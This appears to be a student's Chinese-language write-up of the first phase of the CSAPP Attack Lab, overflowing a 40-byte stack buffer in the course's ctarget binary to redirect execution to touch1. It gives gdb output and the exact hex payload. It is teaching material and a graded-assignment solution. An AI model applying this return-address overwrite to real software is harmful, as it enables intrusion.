1. touch1()

ctarget的流程如下：

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

其中：

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

需要通过代码注入攻击使得 getbuf() 运行结束后返回到 touch1() 函数：

```C
void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

利用`gdb` 调试`ctarget`找到我们需要的信息

```
gdb ctarget
```

首先反汇编test():

```
(gdb)  disas test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:		sub    $0x8,%rsp
   0x000000000040196c <+4>:		mov    $0x0,%eax
   0x0000000000401971 <+9>:		callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq  
```

然后反汇编getbuf():

```
(gdb) > disas getbuf
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
```

在getbuf的首句打上断点并运行：

```
(gdb) b *0x4017a8
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

(gdb) run -q
Starting program: /mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12	buf.c: No such file or directory.
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:		sub    $0x28,%rsp
   0x00000000004017ac <+4>:		mov    %rsp,%rdi
   0x00000000004017af <+7>:		callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```

此时执行到 ==> 处， 此时查看rsp指向内存所存储的值：

```
(gdb) print /x *(int*) $rsp
$1 = 0x401976
```

而0x401976是test()函数中执行完getbuf()下一个语句的地址，因此通过代码注入将这个位置的内容改成touch1()的地址。



从第一行`sub $0x28, %rsp`中显示，在栈上为`buf`提供了0x28也就是40个字节的空间,反汇编`touch1`函数，找到`touch1`函数的起始地址:

```
(gdb)> disas touch1
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
```

从第一行中看出，`touch1`的返回地址是`0x00000000004017c0`

输入字符，首先填充栈，可以使用任意字符，这里我使用的是16进制的0x00填充，然后填充`touch1`地址，最后得到是如下结果：

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

大部分电脑应该都是`little-endian`字节序，即低位在低地址，高位在高地址。

![visual](/home/lalawang/visual.png)

```
> ./hex2raw -i solutions/level1.txt | ./ctarget -q
```

![image-20210506212326205](/home/lalawang/.config/Typora/typora-user-images/image-20210506212326205.png)

